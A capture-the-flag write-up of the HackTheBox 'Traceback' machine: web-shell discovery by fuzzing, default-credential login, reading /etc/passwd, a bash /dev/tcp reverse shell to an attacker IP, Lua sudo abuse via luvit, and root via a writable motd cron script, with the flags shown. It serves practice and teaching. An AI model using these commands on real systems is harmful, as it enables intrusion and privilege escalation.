# Traceback
## Linux
### HackTheBox
### Easy

IP: 10.129.240.171

### NMAP
```Console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  http-server-header: Apache/2.4.29 (Ubuntu)
  http-methods:
    Supported Methods: OPTIONS HEAD GET POST
  http-title: Help us
```

### Source
 * Found the current comment in the HTML: `<!--Some of the best web shells that you might need ;)-->`
 * Googled and found [this Git repository](https://github.com/TheBinitGhimire/Web-Shells)
 * Created a wordlist using the shell names from that page for `feroxbuster`
```Console
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.240.171
 🚀  Threads               │ 50
 📖  Wordlist              │ files/shellList.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.6.4
 💾  Output File           │ dirs/shellList_Fuzz.log
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
200      GET       44l      151w     1113c http://10.129.240.171/
200      GET       59l      100w     1261c http://10.129.240.171/smevk.php
```

### smevk.php
* [Source code for `smevk.php`](https://github.com/TheBinitGhimire/Web-Shells/blob/master/PHP/smevk.php)
* Checked the source code and used the default credentials to log in: `admin:admin`
* Gives access to console information.
* Grabbed `/etc/passwd`
```Console
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
webadmin:x:1000:1000:traceback,,,:/home/webadmin:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
```
* In `/home/webadmin/`:
```Console
$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```
* `/opt/owned.msg`
```Console
$ cat owned.msg
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
```

### Reverse shell
* Created reverse shell using `bash -c 'bash -i >& /dev/tcp/10.10.14.86/1234 0>&1'`
* Gained access and, based on the above note, found the following informatin from `sudo -l`
```Console
webadmin@traceback:/home/webadmin/.ssh$ sudo -l
sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```
* Checked `.bash_history`
```Console
webadmin@traceback:/home/webadmin$ cat .bash_history
cat .bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
rm privesc.lua
logout
ls
cd /
ls
cd home
```
### Pivot
```Console
webadmin@traceback:/dev/shm$ echo "require('os');" > privesc.lua; echo "os.execute('/bin/bash');" >> privesc.lua
<lua; echo "os.execute('/bin/bash');" >> privesc.lua
webadmin@traceback:/dev/shm$ cat privesc.lua
cat privesc.lua
require('os');
os.execute('/bin/bash');
webadmin@traceback:/dev/shm$
```
* Run the `lua` script:
```Console
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/privesc.lua
< sysadmin /home/sysadmin/luvit /dev/shm/privesc.lua
bash -i
bash: cannot set terminal process group (734): Inappropriate ioctl for device
bash: no job control in this shell
sysadmin@traceback:/home/webadmin$ whoami
whoami
sysadmin
sysadmin@traceback:/home/webadmin$
```
* Created a local ssh key to put on the target for a more stable connection.
* User flag: 9c6198596a4eac0817ac3aecfeb90c16
### Privesc
* Used [pspy64](https://github.com/DominicBreuker/pspy) to view the running processes:
```Console
2022/04/19 09:13:01 CMD: UID=0    PID=5462   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```
```Console
sysadmin@traceback:/dev/shm$ cat /etc/update-motd.d/00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
```
* This gets run every 30 seconds by `root`. Injecting code into the file should trigger access to root.
```Console
```
* On ncat listner, receive root access:
```Console
root@traceback:/# whoami
whoami
root
root@traceback:/# cd /root
cd /root
root@traceback:/root# ls
ls
root.txt
root@traceback:/root# cat root
cat root.txt
8f49439e9be9ef90231a3799b89fc4d8
```
